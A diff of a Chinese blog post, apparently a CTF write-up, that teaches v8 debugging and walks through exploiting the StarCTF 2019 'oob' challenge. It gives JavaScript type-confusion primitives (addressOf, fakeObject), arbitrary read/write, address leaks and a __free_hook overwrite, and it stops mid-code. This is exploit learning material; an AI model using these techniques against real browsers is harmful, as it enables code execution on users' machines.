@@ -248,7 +248,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -385,36 +385,31 @@
     <div class="post-body" itemprop="articleBody">
         <p>pwn v8 入门学习，以及 starctf-oob 题目的复现过程</p>
 <span id="more"></span>
-
-<h2 id="v8-环境搭建"><a href="#v8-环境搭建" class="headerlink" title="v8 环境搭建"></a>v8 环境搭建</h2><p>安装依赖</p>
+<h2 id="v8-环境搭建">v8 环境搭建</h2>
+<p>安装依赖</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> binutils python2.7 perl socat <span class="token function">git</span> build-essential gdb gdbserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>安装 depot_tools</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
 <span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/depot_tools"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
 <p>编译 ninja</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/ninja-build/ninja.git 
 <span class="token builtin class-name">cd</span> ninja <span class="token operator">&amp;&amp;</span> ./configure.py --bootstrap
 <span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/ninja"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="v8-编译步骤"><a href="#v8-编译步骤" class="headerlink" title="v8 编译步骤"></a>v8 编译步骤</h2><p>用 depot_tools 的工具拉取 v8 源码</p>
+<h2 id="v8-编译步骤">v8 编译步骤</h2>
+<p>用 depot_tools 的工具拉取 v8 源码</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fetch v8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>随后，同步源码，然而 fetch 之后就是最新的了，这一步也不是必要的</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> v8 <span class="token operator">&amp;&amp;</span> gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>最后编译 v8</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.debug <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.debug <span class="token comment"># debug 版本</span>
 tools/dev/v8gen.py x64.release <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.release <span class="token comment"># release 版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>编译完后，可用在 <code>out.gn/x64.debug</code> 里的 d8 来执行，调试 js 代码</p>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>v8 提供了 gdb 的调试插件<br><img src="/images/3b546c3b/pasted-0.png" alt="gdb-v8-support"></p>
+<h2 id="调试">调试</h2>
+<p>v8 提供了 gdb 的调试插件<br>
+<img src="/images/3b546c3b/pasted-0.png" alt="gdb-v8-support"></p>
 <p>添加到 gdbinit 脚本中</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">source</span> /path_to_v8/tools/gdbinit
 <span class="token builtin class-name">source</span> /path_to_v8/tools/gdb-v8-support.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>写一个测试脚本，学习一下基本的调试</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token operator">:</span> <span class="token string">'asd'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
@@ -429,46 +424,50 @@ tools/dev/v8gen.py x64.release <span class="token operator">&amp;&amp;</span> ni
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 <p>运行 d8 加上 <code>--allow-natives-syntax</code> 参数，以支持 <code>%DebugPrint</code> 和 <code>%SystemBreak</code> 等</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./d8 --allow-natives-syntax ./test.js
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>运行结果如下：<br><img src="/images/3b546c3b/pasted-2.png" alt="d8test"></p>
+<p>运行结果如下：<br>
+<img src="/images/3b546c3b/pasted-2.png" alt="d8test"></p>
 <p><code>%DebugPrint</code> 的功能是输出显示变量，对于对象，会将对象的地址显示出来，而 <code>%SystemBreak</code> 的作用是触发一个调试中断</p>
 <p>现在用 gdb 来调试，<code>gdb ./d8</code></p>
 <p>然后设置一下命令行参数 <code>set args --allow-natives-syntax ./test.js</code></p>
-<p><code>run</code> 命令开始调试，可以看到，由于 <code>%SystemBreak</code>，程序暂停运行，并看到 <code>%DebugPrint(a)</code> 输出<br><img src="/images/3b546c3b/pasted-3.png" alt="dbgtest1"></p>
-<p><code>c</code> 命令继续运行，可以看到对象的地址输出来了<br><img src="/images/3b546c3b/pasted-5.png" alt="dbgtest2"></p>
+<p><code>run</code> 命令开始调试，可以看到，由于 <code>%SystemBreak</code>，程序暂停运行，并看到 <code>%DebugPrint(a)</code> 输出<br>
+<img src="/images/3b546c3b/pasted-3.png" alt="dbgtest1"></p>
+<p><code>c</code> 命令继续运行，可以看到对象的地址输出来了<br>
+<img src="/images/3b546c3b/pasted-5.png" alt="dbgtest2"></p>
 <p>这里附加说明一下，<strong>v8 里的对象地址，最低 bit 都是 1，减去 1 才是真实存储对象数据的起始地址</strong></p>
-<p>由于 v8 提供的 gdb 插件，我们可以使用 <code>job</code> 命令来查看对象更详细的信息<br><img src="/images/3b546c3b/pasted-6.png" alt="dbgtest3"></p>
-<p>先继续运行，来到第三处断点<br><img src="/images/3b546c3b/pasted-7.png" alt="dbgtest4"><br><img src="/images/3b546c3b/pasted-8.png" alt="dbgtest5"></p>
-<p>这里简单讲讲 v8 对象的存储结构，主要有 map，prototype，elements，length，properties<br><img src="/images/3b546c3b/pasted-9.png" alt="dbgtest6"></p>
+<p>由于 v8 提供的 gdb 插件，我们可以使用 <code>job</code> 命令来查看对象更详细的信息<br>
+<img src="/images/3b546c3b/pasted-6.png" alt="dbgtest3"></p>
+<p>先继续运行，来到第三处断点<br>
+<img src="/images/3b546c3b/pasted-7.png" alt="dbgtest4"><br>
+<img src="/images/3b546c3b/pasted-8.png" alt="dbgtest5"></p>
+<p>这里简单讲讲 v8 对象的存储结构，主要有 map，prototype，elements，length，properties<br>
+<img src="/images/3b546c3b/pasted-9.png" alt="dbgtest6"></p>
 <p>map 用来表明对象的类型，elements 是一个对象指针，存储了数组的元素，length 就是数组的大小，properties 也是一个对象指针，存储了对象的属性</p>
-<p>这里再使用 telescope 命令（pwndbg 插件）查看对象的内存布局<br><img src="/images/3b546c3b/pasted-10.png" alt="dbgtest7"></p>
+<p>这里再使用 telescope 命令（pwndbg 插件）查看对象的内存布局<br>
+<img src="/images/3b546c3b/pasted-10.png" alt="dbgtest7"></p>
 <p>另一方面也看到了，length 整数值存储在高 32 位上</p>
-<p>前面说了，elements 也是一个对象，同样可以使用 job 命令查看<br><img src="/images/3b546c3b/pasted-11.png" alt="dbgtest8"></p>
-<h2 id="StarCTF-2019-oob-复现"><a href="#StarCTF-2019-oob-复现" class="headerlink" title="StarCTF 2019 oob 复现"></a>StarCTF 2019 oob 复现</h2><p>题目可以从这里下载：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></p>
+<p>前面说了，elements 也是一个对象，同样可以使用 job 命令查看<br>
+<img src="/images/3b546c3b/pasted-11.png" alt="dbgtest8"></p>
+<h2 id="StarCTF-2019-oob-复现">StarCTF 2019 oob 复现</h2>
+<p>题目可以从这里下载：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></p>
 <p>题目提供了一个 oob.diff 文件，并且 commit 是 <code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
 <p>这里先根据 diff 文件 patch 源码</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> reset --hard  6dc88c191f5ecc5389dc26efa3ca0907faef3598
 <span class="token function">git</span> checkout
 <span class="token function">git</span> apply <span class="token operator">&lt;</span> /path_to_diff/oob.diff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>这里要注意的是，这个题目，使用 debug 版编译，调试的时候有些问题，需要改用 release 模式编译</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>但是为了使用 job 等调试命令，需要在 <code>out.gn/x64.release/args.gn</code> 文件加入以下内容：</p>
 <pre class="line-numbers language-none"><code class="language-none">v8_enable_backtrace &#x3D; true
 v8_enable_disassembler &#x3D; true
 v8_enable_object_print &#x3D; true
 v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>然后编译即可</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ninja -C out.gn/x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><p>接下来要分析题目给的 oob.diff 对 v8 源码做了什么修改，文件关键内容如下：</p>
+<h3 id="oob-diff">oob.diff</h3>
+<p>接下来要分析题目给的 oob.diff 对 v8 源码做了什么修改，文件关键内容如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">...
 +    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,
 +                          Builtins::kArrayOob,2,false);
@@ -495,10 +494,11 @@ v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-ro
 +    &#125;
 +&#125;
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以看到，diff 文件给 Array 数组对象增加了一个 oob 方法，参数个数为 1 和 2 的情况做了不同的处理，参数个数为 1 时，即调用方法无参数的时候（因为对象 this 指针是第一个参数），将 <code>elements[length]</code> 的值返回 ，参数个数为 2 时，即调用方法有一个参数时，将调用方法传递的参数值写入  <code>elements[length]</code></p>
 <p>所以 oob 存在一个<strong>越界读写</strong>数组的漏洞</p>
-<h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>再次回到前面的一张图片<br><img src="/images/3b546c3b/pasted-10.png" alt="layout"></p>
+<h3 id="类型混淆">类型混淆</h3>
+<p>再次回到前面的一张图片<br>
+<img src="/images/3b546c3b/pasted-10.png" alt="layout"></p>
 <p>对象 <code>c</code> 的 elements 指针指向的地址为 <code>0x36563a38de11</code>，而对象 <code>c</code> 的地址为 <code>0x36563a38de31</code>，且对象开头就是 map，所以 map 在 elements 指针指向区域的后面，如果越界读写 elements，就有可能修改 map，造成类型混淆</p>
 <p>参考下面代码，进行一个调试，查看不同类型的数组对象的内存布局</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -513,10 +513,12 @@ v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-ro
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>来到第一处断点，可以看到整数数组对象的 map 变量就在 elements 指向的区域后面，但是 oob 方法只能越界一个元素的位置，这里明显不够<br><img src="/images/3b546c3b/pasted-12.png" alt="starctf1"></p>
-<p>继续运行，来到第二处断点，查看 arr2 即浮点数类型数组对象的内存布局，elements 区域紧接着就是 map，刚好可以修改数组对象的 map 造成类型混淆<br><img src="/images/3b546c3b/pasted-13.png" alt="starctf2"></p>
-<p>我们可以用浮点数类型的数组对象来利用漏洞造成类型混淆，这里先不急，继续运行来到最后一处断点<br><img src="/images/3b546c3b/pasted-14.png" alt="starctf3"></p>
+<p>来到第一处断点，可以看到整数数组对象的 map 变量就在 elements 指向的区域后面，但是 oob 方法只能越界一个元素的位置，这里明显不够<br>
+<img src="/images/3b546c3b/pasted-12.png" alt="starctf1"></p>
+<p>继续运行，来到第二处断点，查看 arr2 即浮点数类型数组对象的内存布局，elements 区域紧接着就是 map，刚好可以修改数组对象的 map 造成类型混淆<br>
+<img src="/images/3b546c3b/pasted-13.png" alt="starctf2"></p>
+<p>我们可以用浮点数类型的数组对象来利用漏洞造成类型混淆，这里先不急，继续运行来到最后一处断点<br>
+<img src="/images/3b546c3b/pasted-14.png" alt="starctf3"></p>
 <p>可以看到，使用 <code>new</code> 的方式创建的数组，elements 位于 map 的后面，无法用于利用漏洞，其它情况的数组对象的内存布局可以多做尝试，这里就不再深究了</p>
 <p>如果将一个 Float 类型的数组的 map 修改为对象数组类型，那么数组里的浮点数数值就被当成对象地址去解析，反之也可以将任意对象地址解析成浮点数，通过一定转换就可以获取对象的地址了</p>
 <p>这里分别写出完成上面两个功能的函数：</p>
@@ -557,7 +559,6 @@ v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-ro
 
 	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>其中 <code>addressOf</code> 函数可以获取任意对象的地址，<code>fakeObject</code> 可以将任意地址伪造成一个 Float 类型的数组对象</p>
 <p>由于 <code>addressOf</code> 是将对象的地址解析成浮点数，不太方便后续运算，这里使用一个自定义的 <code>f2i</code> 函数将其解析成整数，同理 <code>i2f</code> 函数将整数的内存表示解析成浮点数，代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -580,7 +581,6 @@ v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-ro
 	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这里可以测试一下代码：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> test_obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"aa"</span><span class="token operator">:</span> <span class="token string">"aaa"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -588,9 +588,11 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>调试运行，可以看到 <code>addressOf</code> 函数成功的得到了 <code>test_obj</code> 对象的地址<br><img src="/images/3b546c3b/pasted-15.png" alt="starctf4"></p>
-<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>结合 <code>addresssOf</code> 和 <code>fakeObject</code>，可以伪造一个数组对象，控制 elements 指针即可造成任意地址读写，这里画一个伪造的对象的图<br><img src="/images/3b546c3b/pasted-16.png" alt="fakeObject"></p>
+<p>调试运行，可以看到 <code>addressOf</code> 函数成功的得到了 <code>test_obj</code> 对象的地址<br>
+<img src="/images/3b546c3b/pasted-15.png" alt="starctf4"></p>
+<h3 id="任意地址读写">任意地址读写</h3>
+<p>结合 <code>addresssOf</code> 和 <code>fakeObject</code>，可以伪造一个数组对象，控制 elements 指针即可造成任意地址读写，这里画一个伪造的对象的图<br>
+<img src="/images/3b546c3b/pasted-16.png" alt="fakeObject"></p>
 <p>这个伪造的对象的数据可以存在一个 Float 数组里，通过 <code>addressOf</code> 函数，得到数据的存储地址，利用 <code>fakeObject</code> 将该地址转换成数组对象指针，通过这个伪造的数组对象即可造成任意读写，代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//create fake array obj</span>
 <span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
@@ -609,9 +611,10 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>显示创建了一个数组 <code>fake_array</code>，用于伪造数组对象，再通过 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 获得伪造对象的地址，由于 Float 数组的 elements 指针指向的地方刚好紧挨在 <code>fake_array</code> 的 map 前面，即 <code>fake_array</code> 地址之前，数组6个元素占用 0x30 的大小，加上 elements 的 map 和 length 字段又占用 0x10 的大小，则 <code>addressOf(fake_array) - 0x40n</code> 就是 elements 指针指向的地方，那么 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 就是存储 6 个元素的起始地址</p>
-<p>调试一下，可以发现 <code>fake_obj_addr</code> 计算正确<br><img src="/images/3b546c3b/pasted-17.png" alt="starctf5"><br><img src="/images/3b546c3b/pasted-18.png" alt="starctf6"></p>
+<p>调试一下，可以发现 <code>fake_obj_addr</code> 计算正确<br>
+<img src="/images/3b546c3b/pasted-17.png" alt="starctf5"><br>
+<img src="/images/3b546c3b/pasted-18.png" alt="starctf6"></p>
 <p>此时只需要通过<code>fake_array[2] = target_addr - 0x10n</code> 更改 <code>fake_obj</code> 的 elements 指针，然后使用 <code>fake_obj[0] = value</code>，即可对地址 <code>target_addr</code> 写入 <code>value</code> 值，同理可以任意读，代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
@@ -626,25 +629,31 @@ console<span class="token punctuation">.</span><span class="token function">log<
 	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>关掉地址随机化，尝试下面代码，来泄露 <code>__libc_start_main</code> 的地址</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> leak_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token number">0x555555554000n</span><span class="token operator">+</span><span class="token number">0x0000012a47b0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leak_addr = '</span> <span class="token operator">+</span> leak_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>可以看到任意读是没有问题的：<br><img src="/images/3b546c3b/pasted-20.png" alt="starctf7"><br><img src="/images/3b546c3b/pasted-21.png" alt="starctf8"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了任意读写，控制程序执行流的方式还是很多的，下面就分为传统方式和非传统方式来利用</p>
-<h4 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h4><p>传统方式中，可以泄露 libc 地址，修改 <code>__free_hook</code> 为 system，或者用 one_gadget 的方式，无论哪种方式，泄露 libc 地址都是首要的任务</p>
+<p>可以看到任意读是没有问题的：<br>
+<img src="/images/3b546c3b/pasted-20.png" alt="starctf7"><br>
+<img src="/images/3b546c3b/pasted-21.png" alt="starctf8"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>有了任意读写，控制程序执行流的方式还是很多的，下面就分为传统方式和非传统方式来利用</p>
+<h4 id="传统方式">传统方式</h4>
+<p>传统方式中，可以泄露 libc 地址，修改 <code>__free_hook</code> 为 system，或者用 one_gadget 的方式，无论哪种方式，泄露 libc 地址都是首要的任务</p>
 <p>泄露的方式了解到有两种，一种是从一个 v8 对象的地址开始，内存搜索附近的内容，查看有无程序二进制空间的地址，计算得出程序及地址，之后通过基地址加偏移得到 got 表的地址，泄露 got 表项即可泄露 libc 地址，但是这种方式不太稳定，万一遇到内存不可读程序就中止了，所以这里学习另一种稳定的泄露方式</p>
 <p>调试观察下面代码：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>查看对象 <code>a</code> 的结构<br><img src="/images/3b546c3b/pasted-22.png" alt="pwn1_1"></p>
-<p>再查看其 map 类型的结构<br><img src="/images/3b546c3b/pasted-23.png" alt="pwn1_2"></p>
-<p>查看 map 的 constructor 结构<br><img src="/images/3b546c3b/pasted-24.png" alt="pwn1_3"></p>
-<p>在 code 的固定偏移处有程序二进制空间的地址，<br><img src="/images/3b546c3b/pasted-25.png" alt="pwn1_4"><br><img src="/images/3b546c3b/pasted-26.png" alt="pwn1_5"></p>
+<p>查看对象 <code>a</code> 的结构<br>
+<img src="/images/3b546c3b/pasted-22.png" alt="pwn1_1"></p>
+<p>再查看其 map 类型的结构<br>
+<img src="/images/3b546c3b/pasted-23.png" alt="pwn1_2"></p>
+<p>查看 map 的 constructor 结构<br>
+<img src="/images/3b546c3b/pasted-24.png" alt="pwn1_3"></p>
+<p>在 code 的固定偏移处有程序二进制空间的地址，<br>
+<img src="/images/3b546c3b/pasted-25.png" alt="pwn1_4"><br>
+<img src="/images/3b546c3b/pasted-26.png" alt="pwn1_5"></p>
 <p>下面代码即可泄露出程序基地址：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> code_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x30n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
@@ -653,7 +662,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token keyword">var</span> v8_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>code_addr <span class="token operator">+</span> <span class="token number">0x42n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> v8_base <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token number">0x94f780n</span> <span class="token operator">-</span> <span class="token number">0x679000n</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'v8_base = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>v8_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>然后泄露 libc 地址，改 <code>__free_hook</code> 为 system 一把梭</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> free_got_addr <span class="token operator">=</span> v8_base <span class="token operator">+</span> <span class="token number">0x12aa8b8n</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free_got = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -674,7 +682,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token punctuation">&#125;</span>
 
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>但是这样会出现一个段错误，这是 <code>write64</code> FloatArray 对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题，参考的文章使用了 DataView 来改写任意写的方式来解决了这个问题</p>
 <p>DataView 对象偏移 <code>+0x20</code> 处，存有一个 backing_store 指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写，而且不会发生 FloatArray 出现的问题，代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -686,7 +693,6 @@ console<span class="token punctuation">.</span><span class="token function">log<
